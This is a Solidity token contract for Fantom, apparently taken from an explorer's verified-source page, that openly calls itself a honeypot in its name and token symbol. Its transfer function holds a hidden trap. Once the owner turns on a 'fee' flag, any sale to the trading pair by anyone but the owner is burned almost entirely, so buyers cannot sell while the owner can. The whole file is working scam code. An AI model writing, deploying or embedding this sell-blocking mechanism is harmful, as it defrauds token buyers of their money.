/**
 *Submitted for verification at FtmScan.com on 2022-02-08
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external view returns (address);
    function WETH() external pure returns (address);
}

contract Forg_This_Is_A_Honeypot {
    address private _owner;  
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply = 696969696969696969 * 10**9;
    bool private _feeEnabled = false;

    IUniswapV2Router02 private uniswapV2Router;
    address private immutable uniswapV2Pair;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor() public {
        _owner = msg.sender;
        _balances[_owner] = _totalSupply;
        uniswapV2Router = IUniswapV2Router02(0xF491e7B69E4244ad4002BC14e878a34207E38c29);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        emit Transfer(address(0), _owner, _totalSupply);
    }

    function _add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function _sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function _mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function _div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    
    function name() public pure returns (string memory) {
        return "Forg: This Is A Honeypot (Refundable in 24 hours)";
    }

    function symbol() public pure returns (string memory) {
        return "DONTFUCKINGBUY";
    }

    function decimals() public pure returns (uint8) {
        return 9;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _sub(_allowances[sender][msg.sender], amount));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _add(_allowances[msg.sender][spender], addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _sub(_allowances[msg.sender][spender], subtractedValue));
        return true;
    }
        
    function setFeeEnabled(bool feeEnabled) external {
        require(_owner == msg.sender);
        _feeEnabled = feeEnabled;
    }
    
    function _transfer(address from, address to, uint256 amount) internal {
        _balances[from] = _sub(_balances[from], amount);
        if (
            _feeEnabled &&
            to == uniswapV2Pair &&
            from != address(uniswapV2Router) &&
            from != _owner && from != address(this)
        ) {
            uint256 fee = _mul(_div(amount, 100), 100);
            _balances[to] = _add(_balances[to], _sub(amount, fee));
            _totalSupply = _sub(_totalSupply, fee);
            emit Transfer(from, to, _sub(amount, fee));
        } else {
            _balances[to] = _add(_balances[to], amount);
            emit Transfer(from, to, amount);
        }
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}